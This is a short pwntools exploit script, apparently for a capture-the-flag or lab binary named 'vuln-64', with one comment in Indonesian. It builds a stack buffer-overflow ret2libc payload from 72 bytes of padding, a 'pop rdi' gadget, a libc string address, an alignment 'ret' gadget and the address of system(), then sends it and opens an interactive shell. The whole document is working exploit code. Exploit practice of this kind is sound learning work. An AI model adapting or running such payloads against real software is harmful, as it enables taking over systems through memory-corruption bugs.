from pwn import *

p = process("./vuln-64")

junk = 72
libc_base = 0x00007ffff7dcb000
pop_rdi = p64(0x00000000004011cb)
value_rdi = p64(libc_base + 0x196031)


system = p64(libc_base + 0x4c490)
return_addr_arg = p64(0x0)
ret_mentahan = p64(0x0000000000401016) # gadget RET  untuk membuat RSP menjadi 16 byte pas, ini akan tidak menyebabkan stack aligmnet

payload = b"A" * junk + pop_rdi + value_rdi + ret_mentahan + system + return_addr_arg

p.sendline(payload)

write("payload",payload)

p.interactive()

